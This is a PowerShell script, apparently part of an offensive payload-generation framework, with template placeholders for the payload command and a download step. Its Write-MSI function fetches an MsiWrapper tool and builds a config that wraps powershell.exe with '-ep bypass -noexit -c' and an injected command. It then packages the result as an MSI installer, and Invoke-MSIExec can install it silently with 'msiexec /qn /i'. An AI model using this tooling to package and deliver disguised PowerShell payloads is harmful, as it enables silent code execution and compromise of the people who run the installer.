Function Invoke-MSIExec
{
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Output
    )

    msiexec /qn /i "$Output";
}

Function Write-MSI
{
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Output = "$(New-TemporaryFile)",

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $PSCommand = "%psraw%",

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [switch]
        $Exec
    )

    $mwcfg = "$(New-TemporaryFile).txt";
    $mw = "$(New-TemporaryFile).exe";
    %msiwrapper_dl% -o $mw;
    Set-Content -Path "$mwcfg" -Value @"
<MsiWrapper>
  <Installer>
    <UpgradeCode Value="{00000000-1111-2222-3333-000000000000}" />
    <Manufacturer Detect="executable" Value="" />
    <ProductVersion Detect="executable" Value="" />
    <ProductName Detect="executable" Value="" />
    <Comments Detect="" Value="" />
    <Contact Detect="" Value="" />
    <Output FileName="$Output" />
  </Installer>
  <WrappedInstaller>
    <ApplicationId Value="{00000000-0000-0000-0000-000000000000}" />
    <Executable FileName="c:\windows\system32\windowspowershell\v1.0\powershell.exe" />
    <Install>
      <Arguments Value='-ep bypass -noexit -c "$PSCommand"' />
    </Install>
    <Uninstall>
      <Arguments Value="" />
    </Uninstall>
  </WrappedInstaller>
</MsiWrapper>
"@
    & $mw config="$mwcfg";
    if ((resolve-path $Output).path -ne $Output)
    {
        Move-Item -Force $env:tmp\$Output $Output;
    }
    Write-Host "MSI Created: $Output";

    if ($Exec)
    {
        Invoke-MSIExec $Output;
    }

    return $Output;
}
